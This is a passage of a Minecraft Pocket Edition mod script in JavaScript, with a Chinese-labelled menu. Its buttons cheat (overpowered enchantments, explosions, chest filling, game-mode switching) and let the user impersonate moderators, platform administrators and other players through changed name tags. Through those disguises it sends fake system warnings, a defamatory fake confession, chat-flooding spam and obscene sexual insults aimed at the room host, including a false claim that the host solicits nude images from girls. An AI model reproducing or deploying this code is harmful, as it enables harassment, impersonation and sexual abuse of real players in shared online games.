                Entity.setPosition(getPlayerEnt(), Player.getX(), Player.getY() + 1, Player.getZ())
                Player.setFlying(true)
                for (a = 0; a < 35; a++) {
                    Player.clearInventorySlot(a)
                }
                addItemInventory(276, 1, 0);
                addItemInventory(261, 1, 0);
                addItemInventory(310, 1, 0);
                addItemInventory(311, 1, 0);
                addItemInventory(312, 1, 0);
                addItemInventory(313, 1, 0);
                addItemInventory(278, 1, 0);
                addItemInventory(21, 64, 0);
                addItemInventory(383, 64, 11);
                addItemInventory(10, 64, 0);
                addItemInventory(262, 64, 0);
                for (a = 0; a < 35; a++) {
                    Player.enchant(a, Enchantment.SHARPNESS, 23333)
                    Player.enchant(a, Enchantment.UNBREAKING, 23333)
                    Player.enchant(a, Enchantment.FIRE_ASPECT, 2560)
                    Player.enchant(a, Enchantment.KNOCKBACK, 2560)
                    Player.enchant(a, Enchantment.LOOTING, 32767)
                    Player.enchant(a, Enchantment.INFINITY, 23333)
                    Player.enchant(a, Enchantment.POWER, 23333)
                    Player.enchant(a, Enchantment.PUNCH, 2560)
                    Player.enchant(a, Enchantment.FLAME, 2560)
                    Player.enchant(a, Enchantment.PROTECTION, 32767)
                    Player.enchant(a, Enchantment.THORNS, 23333)
                    Player.enchant(a, Enchantment.FORTUNE, 32767)
                    Player.enchant(a, Enchantment.EFFICIENCY, 32767)
                }
                ModPE.showTipMessage("§4开启成功");

            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("防踢")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), " ");
                Entity.setNameTag(getPlayerEnt(), "  ");
                Entity.setNameTag(getPlayerEnt(), " ");
                Entity.setNameTag(getPlayerEnt(), " 。");
                ModPE.showTipMessage("§4其实并无卵用");

            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("z轴前10格爆炸")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                explode(Player.getX(), Player.getY(), Player.getZ() + 10, 30)
                ModPE.showTipMessage("§4看，房主炸妈了");

            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("自爆")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                explode(Player.getX(), Player.getY(), Player.getZ(), 30)
                Player.setHunger(20);
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("崩房装备")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                var count = 0
                for (i = 9; i <= 44; i++) {
                    if (Player.getInventorySlot(i) !== 0) {
                        for (j = 1; j <= Player.getInventorySlotCount(i); j++) {
                            count++;
                        }
                        Player.clearInventorySlot(i);
                    }
                }
                print("已送达");
                Player.addItemInventory(23, 1, 3);
                Player.addItemInventory(76, 1, 0);
                Player.addItemInventory(66, 1, 0);
                Player.addItemInventory(262, 1, 0);
                Player.addItemInventory(407, 1, 0);
            }
        }))
        layout.addView(vb)


        var mlayout = makeMenu(ctx, layout)
        menu.setContentView(mlayout)
        menu.setWidth(dip2px(ctx, 150))
        menu.setHeight(dip2px(ctx, 350))
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(127, 0, 16, 255)))
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 145), dip2px(ctx, 0))
    } catch (err) {
        print(err)
    }
}
var policeuse = 1
var police3 = "房主很抱歉，如果您下载了多玩我的世界盒子请卸载吧，我们多玩我的世界盒子是侵权软件，还内置umeng病毒，盗取你们的信息，你们也可以不用帮我们护盒了，我们的确抄袭了方块启动器，葫芦侠，爱拍，拍大师，我的世界修改大师，还盗取用户个人信息，我觉得良心过意不去，你去告我吧"
var police1 = "§6吔屎啦你，死妈房主."
var police2 = "§6超级黑客12450已开始监控本房间."
var haha1 = "§4系统出现未知错误[250:38]by:Herobrine."
var haha2 = "§4系统出现已知错误:房主作弊[250:61]"

var hzj = "盒子君"
var cjhk = "超级黑客"
var lx = "刘醒"


function qc世界() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
    var layout = new android.widget.LinearLayout(ctx)
    try {
        var button = null,
            butto, layout, ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
        var o = "Player.get"
        var 传送 = null;
        传送x = null;
        传送y = null;
        传送z = null;
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 95), dip2px(ctx, 30));
        menu.setFocusable(true)
        var layout = new android.widget.LinearLayout(ctx)
        layout.setOrientation(1)

        var vb = new android.widget.Button(ctx)
        vb.setText("碎梦者")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "§5碎梦者");
                Server.sendChat("碎梦者会毁掉你的梦")

            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("him")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "");
                Server.sendChat("§eHerobrine加入了游戏")
                Server.sendChat("<guest35653>啊啊啊啊，房主你干什么了，怎么把herobrine惹来了(ﾟДﾟ)＜")

            }
        }))
        layout.addView(vb)

        var va = new android.widget.TextView(ctx)
        va.setText("  by Pvzlight   ")
        va.setTextSize(10)
        layout.addView(va)

        var vb = new android.widget.Button(ctx)
        vb.setText("网警1")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                if (policeuse == 3) {
                    Entity.setNameTag(getPlayerEnt(), hzj)
                    Server.sendChat(police3)
                }
                if (policeuse == 2) {
                    Entity.setNameTag(getPlayerEnt(), cjhk)
                    Server.sendChat(police2)
                    policeuse++
                }
                if (policeuse == 1) {
                    Entity.setNameTag(getPlayerEnt(), lx)
                    Server.sendChat(police1)
                    policeuse++
                }
            }
        }))
        layout.addView(vb)

        var va = new android.widget.TextView(ctx)
        va.setText("  by狭义  ")
        va.setTextSize(10)
        layout.addView(va)

        var vb = new android.widget.Button(ctx)
        vb.setText("一键填箱")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "§3盒子君")
                eval("var x=" + o + "X()," + "y=" + o + "Y()-2," + "z=" + o + "Z();");
                var fid = Level.getTile(x, y, z)
                if (fid == 54 || fid == 146) {
                    const g = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26]
                    var id = Player.getCarriedItem(),
                        t = Player.getCarriedItemData()
                    for (k in g) {
                        Level.setChestSlot(x, y, z, g[k], id, t, 64);
                        try {
                            Level.setChestSlot(x, y, z, g[k] + 27, id, t, 64);
                        } catch (err) {}
                    }
                    clientMessage("填箱成功");
                } else {
                    clientMessage("请站到箱子上面填箱");
                }
            }
        }))
        layout.addView(vb)


        var mlayout = makeMenu(ctx, layout)
        menu.setContentView(mlayout)
        menu.setWidth(dip2px(ctx, 150))
        menu.setHeight(dip2px(ctx, 350))
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(127, 0, 16, 255)))
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 150), dip2px(ctx, 0))
    } catch (err) {
        print(err)
    }
}

function 章鱼脑膜() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
    var layout = new android.widget.LinearLayout(ctx)
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true)
        var layout = new android.widget.LinearLayout(ctx)
        layout.setOrientation(1)
        var va = new android.widget.TextView(ctx)
        va.setText("调戏房主")
        va.setTextSize(20)
        layout.addView(va)



        var vb = new android.widget.Button(ctx)
        vb.setText("炸妈君")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "§3盒子君")

                Server.sendChat("房主你好，为了游戏的公平性请不要开挂 ")
            }
        }))
        layout.addView(vb)


        var vb = new android.widget.Button(ctx)
        vb.setText("老司机")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "")
                Server.sendChat("§5房主要求女生把她的屁屁，胸，和粉嫩的小穴发给房主")
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("管理提醒")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "")
                Server.sendChat("§5〈联机管理员〉§6房主您好，为了游戏的公平性，我们将对开挂房主，游客进行封号，感谢使用联机平台，我们会为您开启房间保护模式 ")

            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("骂房主")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "guest2333")

                Server.sendChat(骂房主喷词)

            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("联盒骂房主")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                var a = Math.ceil(Math.random() * 88888 + 10000)
                var c = "Steve" + a
                try {
                    Entity.setNameTag(getPlayerEnt(), c)
                } catch (e) {}
                Server.sendChat("§5死妈房主你婊子妈因为高潮溢出精水的时候你个狗儿子还跑上去舔那场面真是喜庆无比")
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("联盒进房")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "")
                Server.sendChat("§esteve" + Math.ceil(Math.random() * 88888 + 10000) + " 加入了游戏")
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("平台骂房主")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                var a = Math.ceil(Math.random() * 88888 + 10000)
                var c = "guest" + a
                try {
                    Entity.setNameTag(getPlayerEnt(), c)
                } catch (e) {}

                Server.sendChat("§a垃圾房主本野爹拿你妈的高温血屄用来炼钢 然后锻造出了一把大砍刀一刀子把你妈狗头砍飞了 飞着的头不偏不倚的把你家砸出窟窿")

            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("平台进房")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "")
                Server.sendChat("§eguest" + Math.ceil(Math.random() * 88888 + 10000) + " 加入了游戏")
            }
        }))
        layout.addView(vb)


        var vb = new android.widget.Button(ctx)
        vb.setText("骂房主2")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "") {
                    Server.sendChat(骂房主2喷词);
                }
            }
        }))
        layout.addView(vb)



        var mlayout = makeMenu(ctx, layout)
        menu.setContentView(mlayout)
        menu.setWidth(dip2px(ctx, 150))
        menu.setHeight(dip2px(ctx, 350))
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(127, 0, 16, 255)))
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 150), dip2px(ctx, 0))
    } catch (err) {
        print(err)
    }
}

function 野猪警察() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
    var layout = new android.widget.LinearLayout(ctx)
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true)
        var layout = new android.widget.LinearLayout(ctx)
        layout.setOrientation(1)

        var vb = new android.widget.Button(ctx)
        vb.setText("圆周率")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "")

                {
                    Server.sendChat("§3 3.141 5926 5358 9793 2384 6264 3383 2795 0238 4197 1693 9937 5105 8209 7494 4592 3078 1640 6286 2089 9862 8034 8753 4211 7067 9321 4808 6513 2823 0664 7093 8446 0955 0582 2317 2535 9408 1284 8113 7450 2841 0270 1938 5211 0595 9644 6229 4895 4930 3819 6442 8810 9756 6503 3446 1284 7564 8233 7867 8316 5271 2019 0914 5648 5669 2346 0348 6104 5432 6618 2133 9360 7260 2491 4127 3724 5870 0660 6315 5881 7488 1520 9209 6282 9754 0917 1536 4367 8925 9036 0011 3305 3054 8820 4665 2138 4145 9519 4151 1509 4330 5727 0365 7595 9195 3092 1861 1738 1932 6117 9310 5118 5480 7445 2379 9627 4956 7351 8857 5272 4891 2279 3818 3011 9491 2983 3671 3624 4055 6643 0860 2139 4946 3952 2473 7190 7021 7986 0943 7027 7055 9217 1762 9317 6752 3846 7481 8467 6691 0513 3000 5681 2714 5263 5808 2778 5771 3427 5278 9609 1736 3717 8721 4684 4090 1224 5534 3014 6549 5853 3105 0792 2796 8925 8723 5420 1994 6112 1290 2196 0864 0344 1815 9813 6297 3477 1309 9605 1870 7211 3499 9999 8372 9280 4995 1059 7117 3281 6096 3185 9502 4159 4553 4690 8302 6425 2230 8253 3846 8503 5261 9311 8817 1010 0031 3783 8865 8753 3208 3814 2061 2177 6691 4730 3598 2534 9018 8755 4687 3115 9562 8538 8239 3783 5937 5195 7781 8577 8053 2171 2268 0661 3001 9278 7661 1195 9092 1642 9198 9180 9525 7301 0654 8586 3278 3615 3381 8279 6823 0301 9520 3530 1852 0649 9577 3622 9724 1189 7217 7528 3479 1315 1557 1557 4857 2424 5415 0695 9506 2953 5116 8612 2785 5889 0750 9818 1754 6374 6493 9339 2550 6040 0927 7016 7113 9009 8488 24012889");
                }
            }
        }))
        layout.addView(vb)


        var vb = new android.widget.Button(ctx)
        vb.setText("恐怖袭击")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "") {
                    Server.sendChat("§8有一名以卖身为业的年轻女性，在许久之前曾经接待过一名异国的男性，或许她对这名男子并没有什么太大的印象，不过是众多恩客的其中之一。但是，这名女性怀孕了，在十个月的辛苦之后，她生了一个金发碧眼的小婴孩，「这是个杂种仔啊……」女子心中明白，先不说她太过年轻，或是身为风尘女子养育孩子的艰辛，光是这个孩子的外表就会让这个社会极尽所能的排斥他了。那时的社会风气仍是保守而压抑的，这个孩子一生都会被歧视、排挤，一辈子痛苦。作为一个母亲，万万看不得自己的孩子受苦，但是，那依然是自己的孩子哪……女子犹豫了许久许久，孩子都成长到牙牙学语的年纪了，「不行，这样不行！是时候该做个了断了……」于是，在一个月黑风高的晚上，女子带着那个孩子来到一处荒郊野外，一排排的夜鸦缩着翅膀沉默地凝视着这对母子。女子将孩子放下，接着发了疯似的用双手紧掐着孩子幼弱的脖颈，孩子痛苦而无助地挣扎哭喊，喊着面前那正亲手杀害他的凶手，「妈妈！妈妈！妈妈！妈妈！妈妈！妈妈！妈妈！妈，妈……妈……」哭喊声渐渐止息了，同样渐渐消没的是孩子的呼吸与心跳声，寂静的黑夜中，鸦群凄厉的哀叫刺耳，而那微弱却无一刻停止的，从女子双眼落到孩子脸颊上的滴水声，竟是如此的清晰。……女子背着孩子冰冷，不再有生气的尸体在荒草丛生的墓园中缓慢行进着，她口里哼着温柔的摇篮曲和童谣，一首一首的，正如同孩子生前每晚她都会唱着哄他睡的那些。女子亲手挖掘出了一个小洞，让孩子用安详的睡颜躺卧其中，再轻柔而怜爱地在孩子身上撒下一捧捧的泥土，过了很久很久，直到泥土覆满了孩子的身躯，直到女子唱完了每一首歌，这位母亲才舍得离开她孤单的儿子");
                }
            }
        }))
        layout.addView(vb)

        var vb = new android.widget.Button(ctx)
        vb.setText("白块")
        vb.setOnClickListener(new android.view.View.OnClickListener({
            onClick: function(v) {
                Entity.setNameTag(getPlayerEnt(), "")
                Server.sendChat("■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■");

            }
        }))
        layout.addView(vb)

        var mlayout = makeMenu(ctx, layout)
        menu.setContentView(mlayout)
        menu.setWidth(dip2px(ctx, 150))
        menu.setHeight(dip2px(ctx, 350))
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(127, 0, 16, 255)))
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 150), dip2px(ctx, 0))
    } catch (err) {
        print(err)
    }
}




//版权信息by：柚子人修改大师
var 不是玩家 = "Not a player",
    p1, p2, p3, p4, p5, p6, 控制玩家

try {
    function entityAddedHook(实体) {

        if (实体 != 不是玩家 && Entity.getEntityTypeId(实体) == EntityType.PLAYER) {
            p1 = 实体;
            clientMessage(Entity.getNameTag(实体) + "进服");
        } else if (实体 != 不是玩家 && Entity.getEntityTypeId(实体) == EntityType.PLAYER) {
            p2 = 实体;
            clientMessage(Entity.getNameTag(实体) + "进服");
        } else if (实体 != 不是玩家 && Entity.getEntityTypeId(实体) == EntityType.PLAYER) {
            p3 = 实体;
            clientMessage(Entity.getNameTag(实体) + "进服");
        } else if (实体 != 不是玩家 && Entity.getEntityTypeId(实体) == EntityType.PLAYER) {
            p4 = 实体;
            clientMessage(Entity.getNameTag(实体) + "进服");
        } else if (实体 != 不是玩家 && Entity.getEntityTypeId(实体) == EntityType.PLAYER) {
            p5 = 实体;
            clientMessage(Entity.getNameTag(实体) + "进服");
        } else if (实体 != 不是玩家 && Entity.getEntityTypeId(实体) == EntityType.PLAYER) {
            p6 = 实体;
            clientMessage(Entity.getNameTag(实体) + "进服");
        }

    }



    function dip2px(ctx, dips) {
        return Math.ceil(dips * ctx.getResources().getDisplayMetrics().density);
    }

    function 玩家检测() {
        var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
        var layout = new android.widget.LinearLayout(ctx)
        try {
            var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
            menu.setFocusable(true)
            var layout = new android.widget.LinearLayout(ctx)
            layout.setOrientation(1)

            var 标题 = new android.widget.TextView(ctx)
            标题.setText("玩家列表")
            标题.setTextSize(25)
            标题.setTextColor(android.graphics.Color.WHITE)
            layout.addView(标题)
            var va = new android.widget.TextView(ctx)
            va.setText("  by柚子人修改大师  ")
            va.setTextSize(10)
            layout.addView(va)



            var 按钮1 = new android.widget.Button(ctx)
            按钮1.setText("玩家1(" + Entity.getNameTag(p1) + ")")
            按钮1.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    控制玩家 = p1;
                    if (p1 != null) {
                        clientMessage("已选定该玩家");
                    } else {
                        clientMessage("找不到该玩家");
                    }
                }
            }))
            layout.addView(按钮1)
            var 按钮2 = new android.widget.Button(ctx)
            按钮2.setText("玩家2(" + Entity.getNameTag(p2) + ")")
            按钮2.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    控制玩家 = p2;
                    if (p2 != null) {
                        clientMessage("已选定该玩家");
                    } else {
                        clientMessage("找不到该玩家");
                    }
                }
            }))
            layout.addView(按钮2)
            var 按钮3 = new android.widget.Button(ctx)
            按钮3.setText("玩家3(" + Entity.getNameTag(p3) + ")")
            按钮3.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    控制玩家 = p3;
                    if (p3 != null) {
                        clientMessage("已选定该玩家");
                    } else {
                        clientMessage("找不到该玩家");
                    }
                }
            }))
            layout.addView(按钮3)
            var 按钮4 = new android.widget.Button(ctx)
            按钮4.setText("玩家4(" + Entity.getNameTag(p4) + ")")
            按钮4.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    控制玩家 = p4;
                    if (p4 != null) {
                        clientMessage("已选定该玩家");
                    } else {
                        clientMessage("找不到该玩家");
                    }
                }
            }))
            layout.addView(按钮4)
            var 按钮5 = new android.widget.Button(ctx)
            按钮5.setText("玩家5(" + Entity.getNameTag(p5) + ")")
            按钮5.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    控制玩家 = p5;
                    if (p5 != null) {
                        clientMessage("已选定该玩家");
                    } else {
                        clientMessage("找不到该玩家");
                    }
                }
            }))
            layout.addView(按钮5)
            var 按钮6 = new android.widget.Button(ctx)
            按钮6.setText("玩家6(" + Entity.getNameTag(p6) + ")")
            按钮6.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    控制玩家 = p6;
                    if (p6 != null) {
                        clientMessage("已选定该玩家");
                    } else {
                        clientMessage("找不到该玩家");
                    }
                }
            }))
            layout.addView(按钮6)

            var mlayout = makeMenu(ctx, layout)
            menu.setContentView(mlayout)
            menu.setWidth(dip2px(ctx, 150))
            menu.setHeight(dip2px(ctx, 350))
            menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(127, 0, 0, 0)))
            menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.LEFT | android.view.Gravity.TOP, dip2px(ctx, 0), dip2px(ctx, 0))
        } catch (err) {
            print(err)
        }
    }


    function makeMenu(ctx, layout) {
        var mlayout = new android.widget.RelativeLayout(ctx)
        var svParams = new android.widget.RelativeLayout.LayoutParams(android.widget.RelativeLayout.LayoutParams.FILL_PARENT, android.widget.RelativeLayout.LayoutParams.FILL_PARENT)
        var scrollview = new android.widget.ScrollView(ctx)
        var pad = dip2px(ctx, 2)
        scrollview.setPadding(pad, pad, pad, pad)
        scrollview.setLayoutParams(svParams)
        scrollview.addView(layout)
        mlayout.addView(scrollview)
        return mlayout
    }
} catch (e) {
    print(e)
}

function 狩猎机器人() {
    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
    var layout = new android.widget.LinearLayout(ctx)
    try {
        var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
        menu.setFocusable(true)
        var layout = new android.widget.LinearLayout(ctx)
        layout.setOrientation(1)

        var va = new android.widget.TextView(ctx)
        va.setText("                 特别感谢           ")
        va.setTextSize(30)
        layout.addView(va)

        var va = new android.widget.TextView(ctx)
        va.setText("                      @Pvzlight的防多玩代码，碎梦者外进代码 ")
        va.setTextSize(20)
        layout.addView(va)

        var va = new android.widget.TextView(ctx)
        va.setText("                   @柚子人修改大师的随机ID代码，玩家控制代码（精品算法）")
        va.setTextSize(20)
        layout.addView(va)


        var mlayout = makeMenu(ctx, layout)
        menu.setContentView(mlayout)
        menu.setWidth(dip2px(ctx, 450))
        menu.setHeight(dip2px(ctx, 650))
        menu.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(127, 0, 16, 255)))
        menu.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.TOP, dip2px(ctx, 150), dip2px(ctx, 0))
    } catch (err) {
        print(err)
    }
}

function 毁灭公爵新版本() {
        var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
        var layout = new android.widget.LinearLayout(ctx)
        try {
            var menu = new android.widget.PopupWindow(layout, dip2px(ctx, 75), dip2px(ctx, 30));
            menu.setFocusable(true)
            var layout = new android.widget.LinearLayout(ctx)
            layout.setOrientation(1)
            var vb = new android.widget.Button(ctx)
            vb.setText("切换模式")
            vb.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {

                    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get();
                    ctx.runOnUiThread(new java.lang.Runnable({
                        run: function() {
                            //位置①
                            var win = new android.widget.PopupWindow();
                            //位置②
                            var layout = new android.widget.LinearLayout(ctx);
                            //位置③
                            var button = new android.widget.Button(ctx);
                            button.setText("切换模式");
                            button.setOnClickListener(new android.view.View.OnClickListener() {
                                onClick: function(v) {
                                    if (Level.getGameMode() == 0) {
                                        Level.setGameMode(1)
                                        print("创造")
                                    } else if (Level.getGameMode() == 1) {
                                        Level.setGameMode(0)
                                        print("生存")
                                    }
                                }
                            });
                            //位置④
                            layout.addView(button);
                            //位置⑤
                            win.setContentView(layout);
                            win.setWidth(100);
                            win.setHeight(200);
                            win.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(0, 0, 16, 255)))
                            win.showAtLocation(ctx.getWindow().getDecorView(), android.view.Gravity.RIGHT | android.view.Gravity.BOTTOM, 0, 0);
                        }
                    }));


                }
            }))
            layout.addView(vb)

            var vb = new android.widget.Button(ctx)
            vb.setText("外进")
            vb.setOnClickListener(new android.view.View.OnClickListener({
                onClick: function(v) {
                    //点击屏幕右边的淡蓝色开关即可
                    //作者by jn1221
                    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
                    var 屏幕高度 = ctx.getWindowManager().getDefaultDisplay().getHeight();
                    var 屏幕宽度 = ctx.getWindowManager().getDefaultDisplay().getWidth();

                    var yicu = 0
                    var xmode = 0
                    var qmode = 0
                    var smode = 0
                    var ctx = com.mojang.minecraftpe.MainActivity.currentMainActivity.get()
                    ctx.runOnUiThread(new java.lang.Runnable({
                        run: function() {
                            try {
                                var layout = new android.widget.LinearLayout(ctx);
                                var button = new android.widget.Button(ctx);
                                button.setText("外进");
                                button.setTextColor(android.graphics.Color.argb(255, 255, 255, 255));
                                button.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.argb(50, 100, 255, 255)))
                                button.setOnClickListener(new android.view.View.OnClickListener() {
                                    onClick: function(v) {
                                        print("本功能作者未授权，暂不开放使用")

                                    }
                                });
                                layout.addView(button);
                                button = new android.widget.PopupWindow(layout, dip2px(ctx, 5), dip2px(ctx, 5));
                                button.setContentView(layout);
                                button.setWidth(屏幕宽度 / 20);
                                button.setHeight(屏幕高度 / 20);
